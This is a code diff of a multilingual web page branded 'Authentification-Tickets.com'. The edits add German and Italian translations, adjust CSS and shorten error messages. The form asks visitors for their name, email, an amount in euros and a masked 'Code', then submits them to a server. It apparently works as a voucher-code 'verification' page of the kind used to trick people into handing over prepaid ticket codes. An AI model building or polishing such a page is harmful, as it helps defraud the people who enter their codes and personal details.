@@ -96,7 +96,6 @@
       color: #FFFFFF;
     }
 
-    /* Spinner style */
     .spinner-border-sm { width: 1rem; height: 1rem; border-width: 0.2em; }
 
     .selected-lang {
@@ -117,6 +116,7 @@
       margin-top: 5px;
       box-shadow: 0 10px 25px rgba(0,0,0,0.08) !important;
       z-index: 1070;
+      min-width: 150px;
     }
 
     .lang-options li {
@@ -152,7 +152,7 @@
           <span class="ms-2 d-none d-sm-inline">Français</span>
           <i class="bi bi-chevron-down ms-1 ms-sm-2 fs-7 text-secondary"></i>
         </div>
-        <ul class="lang-options list-unstyled position-absolute end-0 w-100" style="display: none;" id="langMenu">
+        <ul class="lang-options list-unstyled position-absolute end-0" style="display: none;" id="langMenu">
           <li onclick="window.setLang('fr')"><img src="https://flagcdn.com/w20/fr.png" alt="FR" class="me-2 rounded-1"> Français</li>
           <li onclick="window.setLang('en')"><img src="https://flagcdn.com/w20/gb.png" alt="EN" class="me-2 rounded-1"> English</li>
           <li onclick="window.setLang('de')"><img src="https://flagcdn.com/w20/de.png" alt="DE" class="me-2 rounded-1"> Deutsch</li>
@@ -214,14 +214,15 @@
 
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/js/bootstrap.bundle.min.js"></script>
   <script>
-    // --- Logique de traduction ---
     const translations = {
       fr: { brand: '<i class="bi bi-shield-check text-primary"></i> Authentification<span class="text-primary">.</span>', form_title: 'Vérification de sécurité', label_lastname: 'Nom', label_firstname: 'Prénom', label_email: 'Votre adresse email', label_amount: 'Montant (€)', label_code: 'Code', btn_submit: 'Authentifier', footer_copyright: '&copy; 2026 Authentification-Tickets.com — Tous droits réservés.' },
       en: { brand: '<i class="bi bi-shield-check text-primary"></i> Authentication<span class="text-primary">.</span>', form_title: 'Security Verification', label_lastname: 'Last Name', label_firstname: 'First Name', label_email: 'Your Email Address', label_amount: 'Amount (€)', label_code: 'Code', btn_submit: 'Authenticate', footer_copyright: '&copy; 2026 Authentication-Tickets.com — All rights reserved.' },
-      // ... (autres langues)
+      de: { brand: '<i class="bi bi-shield-check text-primary"></i> Authentifizierung<span class="text-primary">.</span>', form_title: 'Sicherheitsüberprüfung', label_lastname: 'Nachname', label_firstname: 'Vorname', label_email: 'Deine E-Mail-Adresse', label_amount: 'Betrag (€)', label_code: 'Code', btn_submit: 'Authentifizieren', footer_copyright: '&copy; 2026 Authentification-Tickets.com — Alle Rechte vorbehalten.' },
+      it: { brand: '<i class="bi bi-shield-check text-primary"></i> Autenticazione<span class="text-primary">.</span>', form_title: 'Verifica di sicurezza', label_lastname: 'Cognome', label_firstname: 'Nome', label_email: 'Il tuo indirizzo email', label_amount: 'Importo (€)', label_code: 'Codice', btn_submit: 'Autentica', footer_copyright: '&copy; 2026 Authentification-Tickets.com — Tutti i diritti riservati.' }
     };
 
     function toggleLangMenu() { const menu = document.getElementById('langMenu'); menu.style.display = menu.style.display === 'none' ? 'block' : 'none'; }
+    
     window.setLang = function(lang) {
       document.querySelectorAll('[data-i18n]').forEach(el => { const key = el.getAttribute('data-i18n'); if(translations[lang][key]) el.innerHTML = translations[lang][key]; });
       document.getElementById('langMenu').style.display = 'none';
@@ -230,13 +231,10 @@
     
     function togglePasswordVisibility() { const i = document.getElementById('code'); i.type = (i.type === 'password' ? 'text' : 'password'); }
 
-    // --- Logique de soumission ---
     document.getElementById('secureContactForm').addEventListener('submit', async function(e) {
       e.preventDefault();
       const btn = document.getElementById('submitBtn');
       const originalText = btn.innerHTML;
-
-      // Animation de chargement
       btn.disabled = true;
       btn.innerHTML = `<span class="spinner-border spinner-border-sm me-2"></span> Traitement...`;
 
@@ -257,7 +255,7 @@
 
         if (!response.ok) {
           const err = await response.json().catch(() => ({}));
-          throw new Error(err.message || `Erreur ${response.status} : Connexion impossible avec le serveur.`);
+          throw new Error(err.message || `Erreur ${response.status} : Connexion impossible.`);
         }
 
         const result = await response.json();
@@ -267,7 +265,7 @@
           throw new Error(result.message || "La vérification a échoué.");
         }
       } catch (err) {
-        alert("Erreur détaillée : " + err.message);
+        alert("Erreur : " + err.message);
         btn.disabled = false;
         btn.innerHTML = originalText;
       }
